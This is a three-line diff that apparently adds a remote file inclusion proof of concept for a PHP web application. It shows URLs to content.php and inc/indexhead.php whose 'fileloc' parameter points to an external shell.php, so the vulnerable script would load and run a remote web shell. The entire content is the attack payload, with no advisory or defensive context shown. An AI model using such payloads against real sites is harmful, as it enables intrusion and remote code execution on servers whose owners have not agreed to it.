@@ -1,0 +1,3 @@
+http://www.example.com/[Path]/content/content.php?fileloc=http://www.example.com/shell.php?
+http://www.example.com/[Path]/inc/indexhead.php?fileloc=
+http://www.example.com/shell.php?
